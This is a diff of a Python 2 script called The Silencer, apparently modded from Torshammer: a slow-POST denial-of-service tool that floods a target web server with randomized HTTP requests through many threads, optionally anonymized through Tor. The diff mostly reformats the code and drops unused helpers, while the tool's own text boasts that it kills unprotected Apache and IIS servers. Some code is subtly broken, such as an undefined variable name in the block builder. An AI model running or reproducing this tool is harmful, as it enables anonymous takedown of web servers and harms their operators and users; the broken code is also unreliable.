@@ -1,32 +1,24 @@
 #!/usr/bin/python
-
 """
 The Silencer: https://github.com/haigiang02/the-silencer
 Based on : https://sourceforge.net/projects/torshammer
+
 The Silencer is a slow post dos testing tool written in Python.
 It can also be run through the Tor network to be anonymized.
 If you are going to run it with Tor it assumes you are running Tor on 127.0.0.1:9150. 
 Kills most unprotected web servers running Apache and IIS via a single instance.
 Kills Apache 1.X and older IIS with ~128 threads.
 Kills newer IIS and Apache 2.X with ~256 threads.
+
 Modded by haigiang02 from zunzutech.com
 """
-
-import os, re, time, sys, random, math, getopt, socks, string, terminal; from threading import Thread
+import os,re,time,sys,random,math,getopt,socks,string,terminal
+from threading import Thread
 
 global stop_now
 global term
 stop_now = False
 term = terminal.TerminalController()
-safe=0
-flag=0
-
-def set_safe():
-	global safe
-	safe = 1
-def set_flag():
-	global flag
-	flag = val
 
 useragents = [
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
@@ -61,34 +53,26 @@ useragents = [
  "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
 ]
 
-referers = [
-	"https://www.google.com/search?q=",
-	"https://www.google.co.uk/search?q=",
-	"https://www.google.cn/search?q=",
-	"https://www.google.com.hk/search?q=",
-	"https://www.google.co.ph/search?q=",
-	"http://www.bing.com/",
-	"https://www.youtube.com/search?q=",
-]
+referers = ["https://www.google.com/search?q=", "https://www.google.co.uk/search?q=", "https://www.google.cn/search?q=", "https://www.google.com.hk/search?q=", "https://www.google.co.ph/search?q=", "https://www.bing.com/search?q=",]
 
 def buildblock(size):
-	out_str=''
-	_LOWERCASE = range(97, 122)
-	_UPPERCASE = range(65, 90)
-	_NUMERIC = range(48, 57)
-	validChars = _LOWECASE + _UPPERCASE + _NUMERIC
-	for i in range(0, size):
-		a = random.choice(validChars)
-		out_str += chr(a)
-	return(out_str)
+    out_str=''
+    _LOWERCASE = range(97, 122)
+    _UPPERCASE = range(65, 90)
+    _NUMERIC = range(48, 57)
+    validChars = _LOWECASE + _UPPERCASE + _NUMERIC
+    for i in range(0, size):
+	    a = random.choice(validChars)
+	    out_str += chr(a)
+    return(out_str)
 def querystring(ammount=1):
-	queryString = []
-	for i in range(ammount):
-		key = buildblock(random.randint(3,10))
-		value = buildblock(random.randint(3,20))
-		element = "{0}={1}".format(key, value)
-		queryString.append(element)
-	return '&'.join(queryString)
+    queryString = []
+    for i in range(ammount):
+        key = buildblock(random.randint(3,10))
+        value = buildblock(random.randint(3,20))
+        element = "{0}={1}".format(key, value)
+        queryString.append(element)
+    return '&'.join(queryString)
 
 class httpPost(Thread):
     def __init__(self, host, port, tor):
@@ -138,7 +122,7 @@ class httpPost(Thread):
             if stop_now:
                 self.running = False
                 break
-         data = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
+        data = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '!', '@', '#', '$', '%', '^',
                 '&', '*', '(', ')', '-', '_', '"', ';', 'NULL', 'null', '\x00', '0xFFFFFFFF',]
         p = random.choice(data)
@@ -152,7 +136,7 @@ class httpPost(Thread):
             while self.running:
                 try:
                     if self.tor:
-			self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9150)
+                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9150)
                     self.socks.connect((self.host, self.port))
                     print term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL
                     break
@@ -161,13 +145,10 @@ class httpPost(Thread):
                         break
                     print term.BOL+term.UP+term.CLEAR_EOL+"DoS - Host is DOWN!"+ term.NORMAL
                     time.sleep(1)
-                    set_flag(1)
-                    set_safe()
                     continue
-	
             while self.running:
                 try:
-                    random.choice([self._send_http_post(), self._send_http_get(), self._send_http_head(), self._send_http_get()+self._send_http_post(), self._send_http_head()+self._send_http_post(), self._send_http_get()+self._send_http_head()])
+                    random.choice([self._send_http_post(), self._send_http_get(), self._send_http_head(), self._send_http_get()+self._send_http_post(), self._send_http_head()+self._send_http_post(), self._send_http_get()+self._send_http_head()]) 
                 except Exception, e:
                     if e.args[0] == 32 or e.args[0] == 104:
                         print term.BOL+term.UP+term.CLEAR_EOL+"Thread broken, restarting..."+ term.NORMAL
@@ -177,9 +158,9 @@ class httpPost(Thread):
                     pass
  
 def usage():
-	print("./thesilencer.py -t <target> [-r <threads> -p <port> -T -h]\n -t|--target <Hostname|IP>\n -r|--threads <Number of threads> Defaults to 1024")
-    	print(" -p|--port <Web Server Port> Defaults to 80\n -T|--tor Enable anonymising through tor on 127.0.0.1:9150, but will slow down the attack. Remember to install and set up Tor before doing this!")
-    	print(" -h|--help Shows this help\n\nEg. ./thesilencer.py -t 192.168.1.100 -r 256\n")
+    print("./thesilencer.py -t <target> [-r <threads> -p <port> -T -h]\n -t|--target <Hostname|IP>\n -r|--threads <Number of threads> Defaults to 1024")
+    print(" -p|--port <Web Server Port> Defaults to 80\n -T|--tor Enable anonymising through tor on 127.0.0.1:9150, but will slow down the attack. Remember to install and set up Tor before doing this!")
+    print(" -h|--help Shows this help\n\nEg. ./thesilencer.py -t 192.168.1.100 -r 256\n")
 
 def main(argv):
     try:
@@ -232,7 +213,7 @@ def main(argv):
 if __name__ == "__main__":
     print "\n/*"
     print " *"+term.RED + " The Silencer"+term.NORMAL
-    print " * Slow HTTP DoS Testing Tool"
+    print " * Slow POST DoS Testing Tool"
     print " * Based on Torshammer, modded by haigiang02 from zunzutech.com"
     print " * Anon-ymized via Tor"
     print " * Only those with enough power and wit survives"
